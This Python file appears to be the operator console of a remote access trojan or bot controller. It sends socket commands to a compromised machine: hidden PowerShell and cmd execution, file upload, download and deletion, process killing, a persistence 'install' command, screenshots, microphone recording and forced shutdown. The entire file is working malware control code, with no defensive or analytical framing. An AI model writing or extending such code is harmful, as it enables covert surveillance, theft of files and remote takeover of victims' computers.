from .ldmain import *
from colorama import Fore, Style
import time


def run_session(sock_fd, mode, input_string, cid_int, info_for):

    def send_data(data):
        try:
            sock_fd.send(data.encode())
        except Exception as s_error:
            print("[ERROR] " + str(s_error))
    
    def send_bytes(data):
        try:
            sock_fd.send(data)
        except Exception as error:
            clients.remove(sock_fd)
            print("[" + Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Error Occurred : " + str(error))

    def file_transfer(m_file=None, r_file=None):
        if m_file is None and r_file is None:
            m_file = input("[" + Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] File Path : ")
            r_file = input("[" + Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] File name to Save as : ")
            
        if "=" in r_file:
            print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] '=' is forbidden in filename.")
        else:
            try:
                with open(m_file, "rb") as send_file:
                    send_data("freceive")
                    send_data(r_file)
                    data = send_file.read()
                    buffer_st = os.stat(m_file)
                    print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] File opened " + m_file + " ("+str(buffer_st.st_size) + " bytes)")
                    time.sleep(1)
                    send_bytes(data)
                    print("["+Style.BRIGHT + Fore.LIGHTBLUE_EX + "*" + Style.RESET_ALL + "] Uploading file.")
            except FileNotFoundError:
                print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] File not found!?")
            except Exception as E:
                print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Error : " + str(E))

    while mode:
        try:
            s_input = input(input_string)
            args = s_input.split()
            if s_input == "exit":
                mode = False

            elif s_input == "botinfo":
                try:
                    read_info(info_for)
                except IndexError:  
                    print("[!] --> BOT is not online!")
            elif s_input == "pid":
                for_id = input("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Enter process name to check : ")
                if len(for_id) > 0:
                    send_data("pid")
                    send_data(for_id)

            elif s_input.startswith("dir"):
                try:
                    param = s_input.split()
                    if param[1] == "-s":
                        directory = input("-> Enter Directory name : ")
                        send_data("dir")
                        send_data(directory)
                    else:
                        send_data("dir")
                        send_data(param[1])

                except IndexError:
                    print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] USAGE :  : dir < Directory >")
            elif s_input == "ls":
                send_data("ls")

            # ==================================================
            elif s_input == "execute":
                filename = input("-> Enter filename to Execute : ")
                if len(filename) > 0:
                    send_data("execute")
                    send_data(filename)
            elif s_input == "powershell":
                print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] '-windowstyle hidden' to execute Powershell in background.")
                ps = input("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] powershell.exe ")
                if len(ps) > 0:
                    send_data("powershell")
                    send_data(ps)

            elif s_input == "cmd":
                cmd = input("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] cmd.exe /c ")
                if len(cmd) > 0:
                    send_data("cmd")
                    send_data(cmd)
            # ==================================================
            elif s_input == "delete":
                filename = input("-> Enter filename to Delete : ")
                if len(filename) > 0:
                    send_data("delete")
                    send_data(filename)

            elif s_input.startswith("download"):
                try:
                    to_download = input("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Enter filename to Download : ")
                    send_data("fupload")
                    send_data(to_download)
                except IndexError: 
                    print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] USAGE :  : download <filename>")
            elif s_input == "upload":
                file_transfer()

            elif s_input == "help":
                print(""" 
                Session Commands
                =================
                botinfo - View Bot information.
                send < data > - Send a command directly.
                
                File Management
                ================
                upload - Upload files.
                download - Download files.
                drives - Get all available drive letters.
                cat < file > - View Contents of a file.
                dir < directory > - Change current directory. (-s switch to specify Name with spaces)
                delete < file > - Delete a file.
                execute - Execute a file.
                ls - List files in current directory.

                System Power
                ================
                poweroff - Shutdown the System.
                reboot - reboot the System.

                System Commands 
                ================
                pkill - Kill a Process by name.
                pid - Get PID of running Process / Check if Process is running or not.
                cmd - Execute command in CMD, No output is returned.
                powershell - Execute command in powershell, No output is returned.
                
                Surveillance and Intelligence
                =================
                screenshot - Take Screen shot.
                micrecord - Start recording microphone.
                
                """)
            elif s_input == "pkill":
                app = input("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Process : ")
                if len(app) > 0:
                    send_data("pkill")
                    send_data(app)

            elif s_input == "drives":
                send_data("drives")
            elif s_input.startswith("cat"):
                try:
                    filename = args[1] 
                    if ".exe" not in filename:
                        if len(filename) > 0:
                            send_data("cat")
                            send_data(filename)
                    else:
                        print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Using that on .exe files is bad.")
                except IndexError:
                    print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] USAGE :  : cat < filename >")
            elif s_input == "install":
                send_data("install")
            elif s_input == "execute":
                app = input("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Executable File Path : ")
                if len(app) > 0:
                    send_data("execute")
                    send_data(app)
            elif s_input.startswith("send"):
                try:
                    send_data(args[1])
                except IndexError:
                    print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] USAGE :  : send <data>")
            elif s_input == "screenshot":
                send_data("screenshot")
            elif s_input == "micrecord":
                send_data("micstart")
                time.sleep(2)
                input("\n\n["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Press Enter to stop recording.")
                send_data("micstop")
            elif s_input == "poweroff":
                send_data("cmd")
                send_data("shutdown /s /t 0")
            elif s_input == "reboot":
                send_data("cmd")
                send_data("shutdown /r /t 0")
        except KeyboardInterrupt:
            mode = False
